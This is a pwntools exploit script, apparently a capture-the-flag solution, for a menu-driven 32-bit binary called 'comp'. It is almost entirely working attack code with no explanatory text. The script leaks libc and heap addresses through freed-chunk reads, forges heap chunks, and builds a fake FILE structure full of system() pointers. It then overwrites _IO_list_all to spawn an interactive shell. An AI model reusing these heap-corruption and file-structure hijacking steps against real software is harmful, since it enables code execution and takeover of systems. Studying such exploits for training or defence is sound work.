from pwn import *

p = process("./comp")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")


def dbg(s):
    gdb.attach(p, s)


def pur(a, b, c):
    '''
    len name price
    '''
    p.sendlineafter(">", '1')
    p.sendlineafter(":", str(a))
    p.sendafter(":", str(b))
    p.sendlineafter(":", str(c))


def com(a, b, c):
    p.sendlineafter(">", '2')
    p.sendlineafter(":", str(a))
    p.sendafter(":", str(b))
    p.sendlineafter(":", str(c))


def thr(a):
    p.sendlineafter(">", '3')
    p.sendlineafter(":", str(a))


def ren(a, b):
    p.sendlineafter(">", '4')
    p.sendline(str(a))
    p.sendline(str(b))

def exp():
    pur(1, 2, 3)
    com(0, 'asdf', 1)

    pur(1, 2, 3)
    thr(0)

    pur(1, 'a', 1)
    com(0, 'bbb\n', 1)
    # context.log_level = 'debug'
    thr(0)
    p.recvuntil('\n')
    libc_base = u32(p.recv(4))-0x1b27b0
    info("libc:"+hex(libc_base))

    pur(1, 2, 3)
    com(0, 'ccc\n', 1)
    pur(1, 2, 3)
    com(2, 'ddd\n', 1)
    pur(1, 2, 3)
    thr(0)
    thr(2)
    com(1, 'eee\n', 1)
    thr(1)
    p.recvuntil('\n')
    heap_base = u32(p.recv(4))-0x138
    info("heap:"+hex(heap_base))

    pur(1, 2, 3)
    pur(1, 2, 3)
    pur(1, 2, 3)
    com(2, 1, 1)  # here
    com(3, 1, 1)

    fakechunk = p32(0)*3+p32(0x49)+p32(heap_base+0x218)*2
    pur(0x3c, fakechunk+'\n', 1)  # 4
    pur(0xfc, 'asd2\n', 1)  # 5
    pur(0x2c, 'asd3\n', 1)  # 6
    thr(5)
    thr(4)
    thr(6)
    system = libc_base+libc.symbols['system']
    fake_file = p32(0) + p32(1)
    fake_file += p32(system)*27+'\x00'
    fake_file += p32(heap_base+0x2a8+8)
    fake_file += p32(0)*2
    fake_file += p32(libc_base+libc.symbols['system'])*20

    pur(0xfc, fake_file+'\n', 1)
    pur(0x14, '1'*0x10+p32(0x48), 1)
    thr(4)
    list_all = libc_base+libc.symbols['_IO_list_all']
    fakechunk = p64(0)+'sh\x00\x00' + p32(0x30)
    fakechunk += p32(0xddaa) + p32(list_all-0x8)
    fakechunk += p32(0) + p32(1)
    context.log_level = 'debug'
    pur(0x3c, fakechunk+'\n', 1)
    #pur(0x400, 1, 1)
    p.recv()
    p.sendlineafter(">", '1')
    p.recv()
    # p.sendlineafter(":", str(400))
    p.interactive()


exp()